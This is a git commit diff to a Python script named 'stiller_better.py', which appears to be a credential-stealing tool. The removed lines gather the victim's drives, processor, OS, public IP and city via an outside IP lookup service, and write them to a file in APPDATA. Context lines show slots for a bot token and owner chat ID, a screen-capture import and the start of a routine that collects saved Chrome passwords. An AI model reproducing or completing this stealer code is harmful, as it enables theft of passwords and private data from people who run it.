c9bf5ecbc82254c6ec34b3a749b6053dc1cc2784
Gleb <60158541+OutTuna@users.noreply.github.com>
2022-01-26 21:30:04 +0200

    Update stiller_better.py

--- stiller_better.py
+++ stiller_better.py
@@ -11,7 +11,6 @@ import time
 import sys
 from PIL import ImageGrab
 from Tools.demo.mcast import sender
-from ip2geotools.databases.noncommercial import DbIpCity
 from os.path import basename
 from base64 import encodebytes
 import asyncio
@@ -22,13 +21,6 @@ TOKEN_API = ""
 OWNER_CHAT_ID = ""
 
 
-drives = str(win32api.GetLogicalDriveStrings())
-drives = str(drives.split('\000')[:-1])
-response = DbIpCity.get(requests.get("https://ramziv.com/ip").text, api_key='free')
-all_data = "Time: " + time.asctime() + '\n' + "Кодировка ФС: " + sys.getfilesystemencoding() + '\n' + "Cpu: " + platform.processor() + '\n' + "Система: " + platform.system() + ' ' + platform.release() + '\nIP: '+requests.get("https://ramziv.com/ip").text+'\nГород: '+response.city+'\nGen_Location:' + response.to_json() + '\nДиски:' + drives
-file = open(os.getenv("APPDATA") + '\\alldata.txt', "w+")
-file.write(all_data)
-file.close()
 
 def Chrome(): 
    text = 'Passwords Chrome:' + '\n' 
